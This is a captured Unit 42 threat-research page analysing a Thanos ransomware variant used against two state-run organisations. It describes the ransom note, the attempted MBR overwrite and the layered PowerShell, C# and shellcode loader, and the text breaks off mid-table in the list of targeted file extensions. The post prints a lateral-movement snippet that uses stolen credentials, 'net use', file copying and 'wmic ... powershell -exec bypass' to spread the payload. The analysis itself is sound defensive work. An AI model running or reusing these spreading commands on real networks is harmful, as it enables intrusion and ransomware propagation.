<link rel="alternate" type="text/xml+oembed" href="https://unit42.paloaltonetworks.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Funit42.paloaltonetworks.com%2Fthanos-ransomware%2F&#038;format=xml" />
<meta name="generator" content="WPML ver:4.3.5 stt:1,28;" />
<meta name="google-site-verification" content="zHZtYOWm9hm4SZgsH7wqiYcOwmsAsxDUDU4UD1QxB40" /><style>#wpdevart_lb_overlay{background-color:#000000;} #wpdevart_lb_overlay.wpdevart_opacity{opacity:0.8 !important;} #wpdevart_lb_main_desc{
				 -webkit-transition: opacity 0.3s ease;
				 -moz-transition: opacity 0.3s ease;
				 -o-transition: opacity 0.3s ease;
				 transition: opacity 0.3s ease;} #wpdevart_lb_information_content{
				 -webkit-transition: opacity 0.3s ease;
				 -moz-transition: opacity 0.3s ease;
				 -o-transition: opacity 0.3s ease;
				 transition: opacity 0.3s ease;}
		#wpdevart_lb_information_content{
			width:100%;	
		}
		#wpdevart_info_counter_of_imgs{
			    display: inline-block;
				padding-left:15px;
				padding-right:4px;
				font-size:20px;
				color:#000000;
		}
		#wpdevart_info_caption{
			    display: inline-block;
				padding-left:15px;
				padding-right:4px;
				font-size:20px;
				color:#000000;
		}
		#wpdevart_info_title{
			    display: inline-block;
				padding-left:5px;
				padding-right:5px;
				font-size:15px;
				color:#000000;
		}
		@-webkit-keyframes rotate {
			to   {-webkit-transform: rotate(360deg);}
			from  {-webkit-transform: rotate(0deg);}
		}
		@keyframes rotate {
			to   {transform: rotate(360deg);}
			from  {transform: rotate(0deg);}
		}
		#wpdevart_lb_loading_img,#wpdevart_lb_loading_img_first{
			-webkit-animation: rotate 2s linear  infinite;
    		animation: rotate 2s linear infinite;
		}
	  </style>        <script>var $ = jQuery;</script>
  
  
<script type="text/javascript">
;(function(win, doc, style, timeout) {
var STYLE_ID = 'at-body-style';
function getParent() {
return doc.getElementsByTagName('head')[0];
}
function addStyle(parent, id, def) {
if (!parent) {
return;
}
var style = doc.createElement('style');
style.id = id;
style.innerHTML = def;
parent.appendChild(style);
}
function removeStyle(parent, id) {
if (!parent) {
return;
}
var style = doc.getElementById(id);
if (!style) {
return;
}
parent.removeChild(style);
}
addStyle(getParent(), STYLE_ID, style);
setTimeout(function() {
removeStyle(getParent(), STYLE_ID);
}, timeout);
}(window, document, "body {visibility:hidden !important}", 3000));
</script>

<script src="//assets.adobedtm.com/9273d4aedcd2/0d76ae0322d7/launch-425c423d843b.min.js" async></script>
<script type="text/javascript" src="https://www.paloaltonetworks.com/content/dam/pan/en_US/includes/attribution.js"></script>
  </head>
  <body class="post-template-default single single-post postid-108595 single-format-standard">
    <!--[if IE]>
      <div class="alert alert-warning">
        You are using an <strong>outdated</strong> browser. Please <a href="http://browsehappy.com/">upgrade your browser</a> to improve your experience.      </div>
    <![endif]-->
    <header class="haeder py-15 position-relative z-index-2">
  <div class="container px-sm-30 px-35">
    <div class="row">
      <div class="first-logo col-sm-auto col-6 mb-sm-0 mb-40 text-sm-center order-1">
                  <a href="https://www.paloaltonetworks.com/">
<!--<img src="/wp-content/uploads/2019/07/paloaltonetwork.svg" class="attachment-full size-full" alt="" height="43" width="124" />-->
<svg width="140" height="26" viewBox="0 0 140 26" fill="none" xmlns="http://www.w3.org/2000/svg">
<path d="M59.4802 4.69592C57.6721 4.69592 55.7937 5.18876 53.469 6.43377L54.7605 9.62741C56.7794 8.50019 58.447 8.00735 59.6682 8.00735C61.0538 8.00735 61.6644 8.52395 61.6644 9.20483V9.25133C61.6644 9.72143 61.2883 9.97974 60.3729 10.0738L58.7766 10.238C54.7843 10.6606 53.1404 12.3985 53.1404 14.7934V14.9577C53.1404 17.2359 55.0188 19.0203 57.6721 19.0203C59.4192 19.0203 60.937 18.2826 61.8597 16.9807L62.1572 18.7857H65.7734V10.5904C65.7734 6.71584 63.5428 4.69592 59.4802 4.69592ZM59.1279 15.8969C57.7899 15.8969 57.1555 15.3803 57.1555 14.5816V14.5351C57.1555 13.8305 57.5543 13.3139 59.0101 13.1031L59.6445 13.0091C60.5713 12.8799 61.1406 12.7095 61.6644 12.3923V13.4317C61.6644 15.0052 60.6777 15.8969 59.1279 15.8969Z" fill="white"/>
<path d="M25.4785 4.78994L20.8528 0.164276L16.2271 4.78994L18.5281 7.09192L6.92828 18.6917L11.5539 23.3174L16.1796 18.6917L13.8787 16.3908L25.4785 4.78994Z" fill="white"/>
<path d="M11.6001 0.164048L0 11.7642L4.62603 16.3902L16.2262 4.79008L11.6001 0.164048Z" fill="white"/>
<path d="M27.7794 7.09215L16.1793 18.6923L20.8053 23.3183L32.4054 11.7182L27.7794 7.09215Z" fill="white"/>
<path d="M72.231 0H68.1219V18.7857H72.231V0Z" fill="white"/>
<path d="M46.2366 4.69592C44.3685 4.69592 42.8683 5.52249 42.0428 6.81709L41.7287 4.93046H38.1125V23.4806H42.2215V17.051C43.0037 18.2567 44.4832 19.0193 46.2366 19.0193C49.5242 19.0193 52.2013 16.1077 52.2013 12.0916V11.6215C52.2013 7.60853 49.5242 4.69592 46.2366 4.69592ZM47.9744 11.9759C47.9744 14.0888 46.871 15.6159 45.0391 15.6159C43.2072 15.6159 42.1038 14.0898 42.1038 11.9759V11.7414C42.1038 9.62741 43.2072 8.10137 45.0391 8.10137C46.871 8.10137 47.9744 9.62741 47.9744 11.7414V11.9759Z" fill="white"/>
<path d="M127.672 4.69592C123.469 4.69592 120.51 7.6075 120.51 11.6236V12.0937C120.51 16.1087 123.469 19.0213 127.672 19.0213C131.875 19.0213 134.834 16.1097 134.834 12.0937V11.6236C134.834 7.60853 131.875 4.69592 127.672 4.69592ZM130.607 11.9759C130.607 14.0888 129.504 15.6159 127.672 15.6159C125.84 15.6159 124.736 14.0898 124.736 11.9759V11.7414C124.736 9.62741 125.84 8.10137 127.672 8.10137C129.504 8.10137 130.607 9.62741 130.607 11.7414V11.9759Z" fill="white"/>
<path d="M138.708 5.54211V5.47185C138.708 5.07304 138.404 4.79097 137.863 4.79097H136.924V6.9514H137.37V6.22299H137.866L138.239 6.9514H138.732L138.274 6.09694C138.552 6.01119 138.708 5.80248 138.708 5.54211ZM137.369 5.18979H137.862C138.144 5.18979 138.261 5.28381 138.261 5.49562V5.51938C138.261 5.70742 138.143 5.82418 137.862 5.82418H137.369V5.18979Z" fill="white"/>
<path d="M137.769 3.63998C136.502 3.63998 135.539 4.60293 135.539 5.87067C135.539 7.13842 136.502 8.10137 137.769 8.10137C139.037 8.10137 140 7.13842 140 5.87067C140 4.60293 139.037 3.63998 137.769 3.63998ZM137.769 7.79554C136.666 7.79554 135.867 6.99687 135.867 5.86964C135.867 4.74241 136.666 3.94375 137.769 3.94375C138.873 3.94375 139.671 4.74241 139.671 5.86964C139.671 6.99687 138.873 7.79554 137.769 7.79554Z" fill="white"/>
<path d="M108.416 0H104.307V18.7857H108.416V0Z" fill="white"/>
<path d="M116.518 15.6159C115.321 15.6159 114.874 15.029 114.874 13.7613V8.10137H119.712V4.93149H114.874V1.76058L110.765 2.37121V14.159C110.765 17.3765 112.409 19.0203 115.697 19.0203C117.153 19.0203 118.867 18.5739 120.276 17.7753L119.102 14.8637C118.279 15.31 117.129 15.6159 116.518 15.6159Z" fill="white"/>
<path d="M95.6662 4.69592C93.8581 4.69592 91.9797 5.18876 89.655 6.43377L90.9465 9.62741C92.9654 8.50019 94.633 8.00735 95.8542 8.00735C97.2397 8.00735 97.8504 8.52395 97.8504 9.20483V9.25133C97.8504 9.72143 97.4743 9.97974 96.5589 10.0738L94.9626 10.238C90.9702 10.6606 89.3264 12.3985 89.3264 14.7934V14.9577C89.3264 17.2359 91.2048 19.0203 93.8581 19.0203C95.6042 19.0203 97.123 18.2826 98.0456 16.9807L98.3432 18.7857H101.959V10.5904C101.959 6.71584 99.7287 4.69592 95.6662 4.69592ZM95.3138 15.8969C93.9748 15.8969 93.3415 15.3803 93.3415 14.5816V14.5351C93.3415 13.8305 93.7403 13.3139 95.1961 13.1031L95.8304 13.0091C96.7572 12.8799 97.3265 12.7095 97.8493 12.3923V13.4317C97.8493 15.0052 96.8637 15.8969 95.3138 15.8969Z" fill="white"/>
<path d="M81.225 4.69592C77.022 4.69592 74.0629 7.6075 74.0629 11.6236V12.0937C74.0629 16.1087 77.022 19.0213 81.225 19.0213C85.4281 19.0213 88.3872 16.1097 88.3872 12.0937V11.6236C88.3862 7.60853 85.4281 4.69592 81.225 4.69592ZM84.1593 11.9759C84.1593 14.0888 83.0559 15.6159 81.224 15.6159C79.3921 15.6159 78.2887 14.0898 78.2887 11.9759V11.7414C78.2887 9.62741 79.3921 8.10137 81.224 8.10137C83.0559 8.10137 84.1593 9.62741 84.1593 11.7414V11.9759Z" fill="white"/>
<path d="M98.0446 22.1168H99.0975L100.551 24.0334H100.566V22.1168H101.532V25.4964H100.513L99.0251 23.5313H99.0107V25.4964H98.0446V22.1168Z" fill="white"/>
<path d="M102.816 22.1168H105.771L105.81 22.9372H103.825V23.4011H105.385V24.1491H103.825V24.676H105.868L105.829 25.4964H102.816V22.1168Z" fill="white"/>
<path d="M107.925 22.9857H106.742L106.78 22.1168H110.088L110.127 22.9857H108.944V25.4964H107.925V22.9857Z" fill="white"/>
<path d="M110.943 22.1168H112.024L112.575 24.4632H112.628L113.342 22.1168H114.333L115.033 24.4632H115.086L115.627 22.1168H116.66L115.771 25.4964H114.444L113.826 23.4589H113.797L113.169 25.4964H111.836L110.943 22.1168Z" fill="white"/>
<path d="M117.404 23.8071C117.404 22.7057 118.152 22.0155 119.335 22.0155C120.518 22.0155 121.267 22.7057 121.267 23.8071C121.267 24.9085 120.519 25.5987 119.335 25.5987C118.152 25.5987 117.404 24.9075 117.404 23.8071ZM120.257 23.8071C120.257 23.2234 119.92 22.8752 119.335 22.8752C118.75 22.8752 118.412 23.2234 118.412 23.8071C118.412 24.3919 118.75 24.7391 119.33 24.7391C119.914 24.7391 120.257 24.3909 120.257 23.8071Z" fill="white"/>
<path d="M122.363 22.1168H124.334C125.231 22.1168 125.672 22.5414 125.672 23.3287C125.672 23.8691 125.449 24.2369 125.014 24.4105L125.816 25.4974H124.667L124.044 24.6089H123.378V25.4974H122.363V22.1168ZM124.202 23.8164C124.54 23.8164 124.661 23.6284 124.661 23.3721C124.661 23.1159 124.54 22.933 124.202 22.933H123.377V23.8164H124.202Z" fill="white"/>
<path d="M126.989 22.1168H128.002V23.3628H128.418L129.408 22.1168H130.547L130.552 22.1209L129.259 23.7389L130.625 25.4923L130.62 25.4964H129.437L128.414 24.1977H128.002V25.4964H126.989V22.1168Z" fill="white"/>
<path d="M131.402 25.2743V24.3475H131.407C131.972 24.6327 132.523 24.7721 133 24.7721C133.363 24.7721 133.546 24.6853 133.546 24.5159C133.546 24.3465 133.425 24.3031 132.7 24.1873C131.909 24.0623 131.382 23.8247 131.382 23.1438C131.382 22.5115 131.938 22.0238 133.024 22.0238C133.459 22.0238 133.912 22.1158 134.333 22.2945V23.212L134.328 23.2172C133.927 22.9857 133.386 22.84 132.951 22.84C132.565 22.84 132.411 22.932 132.411 23.0859C132.411 23.2843 132.648 23.3029 133.242 23.4052C134.033 23.5406 134.56 23.7627 134.56 24.4777C134.56 25.0325 134.145 25.5884 132.952 25.5884C132.364 25.5884 131.894 25.4675 131.402 25.2743Z" fill="white"/>
</svg>

</a>

      </div>

      <div class="col-sm-auto col-6 text-sm-center order-sm-2 order-4 second-logo-unit">
        <a href="https://unit42.paloaltonetworks.com/"><img src="/wp-content/uploads/2019/07/unit42.svg" class="attachment-full size-full" alt="" height="35" width="105" /></a>
      </div>

      <div class="col-auto d-sm-none ml-auto mb-40 order-2">
        <button class="btn__search" data-toggle="collapse" data-target="#search"><i class="ui ui-1"></i></button>
      </div>

      <div id="search" class="collapse d-sm-block col-sm-auto col-12 ml-auto order-3">
        <div class="pt-sm-0 pt-20 pb-sm-0 pb-40 mt-sm-0 mt-n30">
                      <input type="search" placeholder="Search Unit 42" id="innerSearch" class="header__search" value="" required>
                  </div>
      </div>

      <div class="col-auto d-sm-none d-flex ml-auto align-items-center order-5">
        <button class="btn__menu rounded" data-toggle="collapse" data-target="#navigation">Menu</button>
      </div>
    </div>
  </div>
</header>

<nav id="navigation" class="site-nav collapse d-sm-block pb-20 mt-sm-10">
  <div class="container px-sm-30">
    <ul id="menu-primary-navigation" class="main-menu d-sm-flex font-weight-medium"><li id="menu-item-97290" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-97290"><a href="https://unit42.paloaltonetworks.com/tools/">Tools</a></li>
<li id="menu-item-41" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-41"><a href="https://unit42.paloaltonetworks.com/atoms/">ATOMs</a></li>
<li id="menu-item-98931" class="menu-item menu-item-type-post_type_archive menu-item-object-events menu-item-98931"><a href="https://unit42.paloaltonetworks.com/events/">Speaking Events</a></li>
<li id="menu-item-81229" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-81229"><a href="https://unit42.paloaltonetworks.com/about-unit-42/">About Us</a></li>
</ul>  </div>
</nav>

  <article class="article overflow-hidden">
    
<header class="article__header py-sm-25 pt-40 pb-25 bg-gray-700">
  <div class="container">
    
    <h1 class="article__header__title mb-sm-30 mb-40">Thanos Ransomware: Destructive Variant Targeting State-Run Organizations in the Middle East and North Africa</h1>

    <ul class="article__entry-meta d-flex flex-wrap align-items-center text-black">
      <li class="mr-10 mb-10 px-20 rounded-pill d-flex bg-gray-200"><div class="post-views post-108595 entry-meta">
			
			
			<span class="post-views-count">14,293</span>
			</div> <span class="ml-5">people reacted</span></li>
      <li class="d-sm-none col-12 p-0"></li>
      <li class="mr-10 mb-10 px-20 rounded-pill bg-gray-200"><span class="ldc-ul_cont idc_ul_cont_not_liked_inner" onclick="alter_ul_post_values(this,'108595','like')"><i class="ui ui-2"></i><span class="ml-5">7</span></span></li>
      <li class="mb-10 px-20 rounded-pill bg-gray-200"><span class="span-reading-time rt-reading-time"><span class="rt-label rt-prefix"></span> <span class="rt-time"> 13</span> <span class="rt-label rt-postfix"></span></span> min. read</li>
    </ul>

    <div class="article__share position-relative">
      <div class="dropdown dropdown-right">
        <button type="button" class="px-25 text-black bg-white text-uppercase rounded-pill" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Share <i class="ui ui-6 ml-10 align-text-top"></i>
        </button>
        <div class="dropdown-menu rounded-pill" role="toolbar">
          <div class="share-dropdown px-20 py-10 text-black font-size-sm">
            <div class="row align-items-center flex-nowrap">
              <div class="col">
                <div class="d-flex align-items-center">
                  <a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Funit42.paloaltonetworks.com%2Fthanos-ransomware%2F" target="_blank"><i class="ui ui-7"></i></a>
                  <a href="https://twitter.com/home?status=https%3A%2F%2Funit42.paloaltonetworks.com%2Fthanos-ransomware%2F+-+Thanos+Ransomware%3A+Destructive+Variant+Targeting+State-Run+Organizations+in+the+Middle+East+and+North+Africa" target="_blank"><i class="ui ui-8"></i></a>
                  <a href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Funit42.paloaltonetworks.com%2Fthanos-ransomware%2F&title=Thanos+Ransomware%3A+Destructive+Variant+Targeting+State-Run+Organizations+in+the+Middle+East+and+North+Africa&summary=&source=" target="_blank"><i class="ui ui-9"></i></a>
                  <a href="//www.reddit.com/submit?url=https://unit42.paloaltonetworks.com/thanos-ransomware/" target="_blank"><i class="ui ui-10"></i></a>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>
</header>    <div class="article__summary py-25 text-gray-500 font-size-sm">
  <div class="container">
    <div class="row align-items-center no-gutters">
      <div class="col-sm-auto col-12 mb-sm-0 mb-35">
        <i class="ui ui-11 text-gray-700 mr-sm-20"></i>
      </div>
  
      <div class="col-sm col-12">
        <p>
          By <a href="https://unit42.paloaltonetworks.com/author/robertfalcone/" title="Posts by Robert Falcone" class="author url fn" rel="author">Robert Falcone</a>        </p>
        <p><time datetime="2020-09-04T13:00:34+00:00">September 4, 2020 at 6:00 AM</time></p>
        <p>Category: <a href="https://unit42.paloaltonetworks.com/category/unit-42/" rel="category tag">Unit 42</a></p>
        <p>Tags: <a href="https://unit42.paloaltonetworks.com/tag/middle-east/" rel="tag">Middle East</a>, <a href="https://unit42.paloaltonetworks.com/tag/ransomware/" rel="tag">ransomware</a>, <a href="https://unit42.paloaltonetworks.com/tag/thanos/" rel="tag">Thanos</a></p>
      </div>
    </div>
  </div>
</div>    <div class="py-30 bg-white">
      <div class="container">
        <div class="article__content pb-30">
                      <figure class="mb-30 text-center">
              <img width="900" height="450" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/09/Ransomware-r3d3.png" class="attachment-single size-single" alt="An illustration of the concept of ransomware, including Thanos" />            </figure>
                    <p class="wpml-ls-statics-post_translations wpml-ls">This post is also available in: 
    <span class="wpml-ls-slot-post_translations wpml-ls-item wpml-ls-item-ja wpml-ls-first-item wpml-ls-last-item wpml-ls-item-legacy-post-translations"><a href="https://unit42.paloaltonetworks.jp/thanos-ransomware/" class="wpml-ls-link"><span class="wpml-ls-native" lang="ja"></span><span class="wpml-ls-display"><span class="wpml-ls-bracket"> (</span>Japanese<span class="wpml-ls-bracket">)</span></span></a></span></p><h2><a id="post-108595-_slh6j2obia2"></a><strong>Executive Summary</strong></h2>
<p>On July 6 and July 9, 2020, we observed files associated with an attack on two state-run organizations in the Middle East and North Africa that ultimately installed and ran a variant of the Thanos ransomware. The Thanos variant created a text file that displayed a ransom message requesting the victim transfer 20,000$ into a specified Bitcoin wallet to restore the files on the system. We do not have visibility into the overall impacts of these attacks or whether or not the threat actors were successful in receiving a payment from the victims.</p>
<p><img class="aligncenter wp-image-108598" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/09/word-image.png" alt="HOW_TO_DECRYPT_YOUR_FILES.txt - Notepad - This shows a Thanos ransomware message displayed to victims, including the following text: &quot;Your files are Encrypted. Don't worry, you can return all your files! I don't want to loose your files too. If I want to do something bad to you I would've wipe all of your network but that's not helping me. :) so temporary all of your files is mine now until you pay the price of them. If you want to restore them contact me from the address below, I'll be happy to help you to get out of this situation. You've got 48 hours (2 Days), before you lost your files forever. I will treat you good if you treat me good too.&quot; The note closes with contact info, a Bitcoin wallet ID and a demand for &quot;20,000$.&quot;" width="900" height="398" /></p>
<p style="text-align: center;"><i><span style="font-weight: 400;">Figure 1. Thanos ransom note displayed after encrypting files.</span></i></p>
<p>The ransomware was also configured to overwrite the master boot record (MBR), which is an important component loaded on a systems hard drive that is required for the computer to locate and load the operating system. The ransomware overwrites the MBR to display the same ransom message as the previously mentioned text file, which is a technique we do not see often. The most notable example weve observed involved the <a href="https://unit42.paloaltonetworks.com/unit42-threat-brief-petya-ransomware/">Petya ransomware</a> in 2017. Overwriting the MBR is a more destructive approach to ransomware than usual. Victims would have to expend more effort to recover their files  even if they paid the ransom. Fortunately, in this case, the code responsible for overwriting the MBR caused an exception because the ransom message contained invalid characters, which left the MBR intact and allowed the system to boot correctly. This means that even though the ransomware was configured to overwrite the MBR, the threat actors were unsuccessful in causing the computers they infected with the Thanos ransomware not to boot.</p>
<p><img class="aligncenter wp-image-108600" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/09/word-image-1.png" alt="This Thanos ransomware message reads: &quot;Dont worry, you can return all your files! The Price to get all things to the normal : 20,000$&quot; It closes with a Bitcoin wallet ID and a contact email. " width="720" height="400" /></p>
<p style="text-align: center;"><i><span style="font-weight: 400;">Figure 2. Thanos ransom note displayed if MBR overwrite was successful.</span></i></p>
<p>The Thanos ransomware was first discussed by <a href="https://www.recordedfuture.com/thanos-ransomware-builder/">Recorded Future</a> in February 2020 when it was advertised for sale on underground forums. The Thanos ransomware has a builder that allows actors to customize the sample with a variety of available settings. The fact Thanos is for sale suggests the likelihood of multiple threat actors using this ransomware. However, we believe with high confidence that the same actor used a Thanos variant in attacks on two state-run organizations in the Middle East and North Africa.</p>
<p>Based on our telemetry, we first observed Thanos on Jan. 13, 2020, and have seen over 130 unique samples since. We believe the threat actors had prior access to these organizations networks, as the samples contained credentials that we believe the actors had stolen from systems on these organizations networks prior to the delivery of the ransomware.</p>
<p>This particular attack involved multiple layers of PowerShell scripts, inline C# code and shellcode in order to load Thanos into memory and to run it on the local system. These layers were largely based on code freely available in open source frameworks, such as <a href="https://github.com/FuzzySecurity/Sharp-Suite">Sharp-Suite</a> and <a href="https://github.com/TheWover/donut">Donut</a>. One of the layers involved a custom PowerShell that was responsible for spreading Thanos to other systems on the local network using previously mentioned stolen credentials.</p>
<p>We analyzed this specific Thanos sample that the actors built for the Middle Eastern and Northern African state-run organizations. We determined that the ransomware was loaded into and run from within memory at these organizations. We found the Thanos variant is functionally very similar to the variant discussed by <a href="https://www.fortinet.com/blog/threat-research/analysis-of-net-thanos-ransomware-supporting-safeboot-with-networking-mode">Fortinet in July 2020</a>. The sample analyzed by Fortinet also contained network-spreading functionality enabled, which included network credentials from another state-run organization in the same municipality as the Middle Eastern state-run organization we observed. The sample analyzed by Fortinet included the same Bitcoin wallet and contact email that we observed. When combined with the targeting of an organization in the same municipality in a similar time frame, this suggests a common actor behind these attacks.</p>
<p>Palo Alto Networks customers are protected from the attacks discussed in this blog by <a href="https://www.paloaltonetworks.com/products/secure-the-network/wildfire">WildFire</a>, which correctly identifies all related samples as malicious, and <a href="https://www.paloaltonetworks.com/cortex/cortex-xdr">Cortex XDR</a>, which blocks the components involved in this ransomware infection.</p>
<h2><a id="post-108595-_a2jnz7klteaa"></a><strong>Overview of Thanos Variant Activity</strong></h2>
<p>We do not know how the actors delivered the Thanos ransomware to the two state-run organizations in the Middle East and North Africa. However, we know the threat group behind the use of these tools had previous access to these networks as they had already obtained valid credentials from the networks. The exact same Thanos sample was used at both of these organizations, which suggests that the same actor created the sample using the Thanos builder.</p>
<p>The Thanos sample created for these networks executes several layers before the .NET Thanos ransomware runs on a system, specifically using code from several open source frameworks. The layers start at the top with a PowerShell script that not only loads another PowerShell script as a sub-layer, but also attempts to spread the ransomware to other systems on the network using previously stolen credentials. The PowerShell in the second layer does nothing more than load embedded C# code inline so the initial PowerShell script can execute it. The C# code is the third layer, and it is based on <a href="https://github.com/FuzzySecurity/Sharp-Suite/blob/master/UrbanBishop/BerlinDefence.cs">UrbanBishop</a>, which is publicly available as part of the <a href="https://github.com/FuzzySecurity/Sharp-Suite">Sharp-Suite framework on GitHub</a>. The UrbanBishop code is responsible for writing shellcode to a remote process and executing it, of which the shellcode is the final layer before running the Thanos ransomware. The shellcode in this case was created by Donut, which is another open source framework that will generate shellcode that can load and execute .NET assemblies in memory.</p>
<p><img class="aligncenter wp-image-108714 size-full" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/09/blog-thano-ransomware-illustrations-r2d1_900x450.png" alt="Layers executed to run Thanos ransomware on the system include: 1) LogicalDuckBill spreads Ransomware and loads a PowerShell script to run Ransomware; 2) Loaded PowerShell Script runs inline C# based on UrbanBishop; 3) C# based on UrbanBishop loads shellcode into a remote process and executes it; 4) Shellcode generated by Donut framework loads .NET Executable into memory and executes it; 5) .NET Executable is a variant of the Thanos Ransomware. " width="900" height="450" /></p>
<p style="text-align: center;"><i><span style="font-weight: 400;">Figure 3. Layers executed to run the Thanos ransomware on the system.</span></i></p>
<h2><a id="post-108595-_qehe7rkwn87s"></a><strong>PowerShell Spreader</strong></h2>
<p>The PowerShell spreader, which we call LogicalDuckBill, has two primary purposes:</p>
<ol>
<li>Loading and running the Thanos ransomware.</li>
<li>Spreading to other systems by copying itself to and executing itself on remote systems.</li>
</ol>
<p>The loader functionality within LogicalDuckBill starts with a base64 encoded PowerShell script that it will decode and run using the IEX command. The PowerShell decoded and executed contains the following code, which effectively loads C# code based on UrbanBishop that LogicalDuckBill will call later to inject shellcode:</p>
<p><span style="font-family: 'courier new', courier, monospace;">$code = @&#8221;</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">[C# code based on UrbanBishop]</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">&#8220;@</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">Add-Type -TypeDefinition $code -Language CSharp</span></p>
<p>LogicalDuckBill will then check to see if a file named logdb.txt or logdb.txt.locked exists in the c:\ drive before running, which is the method the spreader uses to be sure to only run one instance of the embedded ransomware on each system. We also observed another related sample that looked for logdbnnn.txt instead, which is why we call this script LogicalDuckBill. If these files are not present, LogicalDuckBill will write 1 to this text file and then continue to carry out its functionality.</p>
<p>LogicalDuckBill then creates a notepad.exe process, which it will then iterate through running processes to find the process ID (PID) of the created notepad.exe process. With the PID of the notepad process, the PowerShell script calls the Do method in the loaded C# code based on UrbanBishop, which ultimately injects shellcode generated by the Donut framework into the notepad process and executes it. The shellcode then decrypts and loads an embedded .NET executable into memory and executes it, which is the Thanos ransomware payload.</p>
<p>The spreader functionality of LogicalDuckBill starts with the script using the Get-NetTCPConnection cmdlet to get the remote addresses of the current TCP connections on the system. The code then looks through these remote addresses for those that start with <span style="font-family: 'courier new', courier, monospace;">10.</span>, <span style="font-family: 'courier new', courier, monospace;">172.</span> and <span style="font-family: 'courier new', courier, monospace;">192.</span> as the first octet and will iterate through each discovered network by changing the last octet from <span style="font-family: 'courier new', courier, monospace;">1</span> to <span style="font-family: 'courier new', courier, monospace;">254</span> in a loop. For each iteration, the script will use the Test-NetConnection cmdlet to see if the script can connect to each remote system over SMB port tcp/445, and if it can, it uses the <span style="font-family: 'courier new', courier, monospace;">net use</span> command to connect to the remote system with previously stolen credentials and mounts the remote systems <span style="font-family: 'courier new', courier, monospace;">C:</span> drive to the local systems <span style="font-family: 'courier new', courier, monospace;">X:</span> drive. The script then uses the <span style="font-family: 'courier new', courier, monospace;">copy</span> command to copy itself to the newly mapped <span style="font-family: 'courier new', courier, monospace;">X:</span> drive, which effectively copies LogicalDuckBill to the remote system. The script will then use <span style="font-family: 'courier new', courier, monospace;">wmic</span> to run <span style="font-family: 'courier new', courier, monospace;">process call create</span> on the remote system to run the newly copied LogicalDuckBill sample on the remote system. The spreading functionality finished each iteration by deleting the mapped drive, all of which is carried out by the following code:</p>
<p><span style="font-family: 'courier new', courier, monospace;">if((Test-NetConnection $tr -Port 445).TcpTestSucceeded){</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">net use x: \\[IP address]\c$ /user:[Victim Domain]\[Username] [Password]</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">copy c:\windows\update4.ps1 x:\windows\update4.ps1</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">wmic /node:[IP address] /user:[Victim Domain]\[Username] /password:[Password] process call create &#8220;powershell -exec bypass -file c:\windows\update4.ps1&#8221;</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">net use x: /del /y</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">}</span></p>
<p>This spreading method in LogicalDuckBill is similar to one found within Thanos C# code. However, using the PowerShell script to spread allowed the actors to include previously stolen network credentials when creating the mapped drive and when running the copied PowerShell script using <span style="font-family: 'courier new', courier, monospace;">wmic</span>.</p>
<h2><a id="post-108595-_cfsl6n77npie"></a><strong>Thanos Ransomware</strong></h2>
<p>The Thanos ransomware was first observed by <a href="https://www.recordedfuture.com/thanos-ransomware-builder/">Recorded Future</a> in February 2020 when it was advertised for sale on underground forums. The Thanos ransomware has code overlaps with other ransomware variants, such as <a href="https://autofocus.paloaltonetworks.com/#/tag/Unit42.Hakbit">Hakbit</a>, and has a builder that allows the user to customize the sample with a variety of available settings. This ransomware appears to be still under active development, as we observed newly added functionality in the samples built to run on the Middle Eastern and Northern African state-run organizations compared to the original samples analyzed by Recorded Future. In fact, the Thanos ransomware built to run on these two organizations networks was closer in available functionality to the variant discussed by <a href="https://www.fortinet.com/blog/threat-research/analysis-of-net-thanos-ransomware-supporting-safeboot-with-networking-mode">Fortinet in July 2020</a>. The most obvious difference is that the disabling of safe boot discussed by Fortinet is not available in these samples.</p>
<p>Like other Thanos ransomware samples, the variant built to run on these two organizations networks uses a 2048-bit RSA public key to encrypt files whose file extensions match those listed in Table 1. After encrypting the files contents, Thanos will add the file extension .locked to the file on disk.</p>
<table>
<tbody>
<tr>
<td>dat</td>
<td>ppt</td>
<td>mdb</td>
<td>odg</td>
<td>backup</td>
<td>aiff</td>
</tr>
<tr>
<td>txt</td>
<td>doc</td>
<td>dbf</td>
<td>raw</td>
<td>pdf</td>
<td>flac</td>
</tr>
<tr>
<td>jpeg</td>
<td>docx</td>
<td>odb</td>
<td>nef</td>
<td>cert</td>
<td>m4a</td>
</tr>
<tr>
<td>gif</td>
<td>sxi</td>
<td>myd</td>
<td>svg</td>
<td>docm</td>
<td>csv</td>
</tr>
<tr>
<td>jpg</td>
<td>sxw</td>
<td>php</td>
<td>psd</td>
<td>xlsm</td>
<td>sql</td>
</tr>
<tr>
<td>png</td>
<td>odt</td>
<td>java</td>
<td>vmx</td>
<td>dwg</td>
<td>ora</td>
</tr>
<tr>
<td>php</td>
<td>hwp</td>
<td>cpp</td>
<td>vmdk</td>
<td>bak</td>
<td>mdf</td>
</tr>
<tr>
<td>cs</td>
<td>tar</td>
<td>pas</td>
<td>vdi</td>
<td>qbw</td>
<td>ldf</td>
</tr>
<tr>
<td>cpp</td>
<td>bz2</td>
<td>asm</td>
<td>lay6</td>
<td>nd</td>
<td>ndf</td>
</tr>
<tr>
<td>rar</td>
<td>mkv</td>
<td>key</td>
<td>sqlite3</td>
<td>tlg</td>
<td>dtsx</td>
</tr>
<tr>
<td>zip</td>
<td>eml</td>
<td>pfx</td>
<td>sqlitedb</td>
<td>lgb</td>
<td>rdl</td>
</tr>
<tr>
<td>html</td>
<td>msg</td>
<td>pem</td>
<td>accdb</td>
<td>pptx</td>
<td>dim</td>
</tr>
<tr>
<td>htm</td>
<td>ost</td>
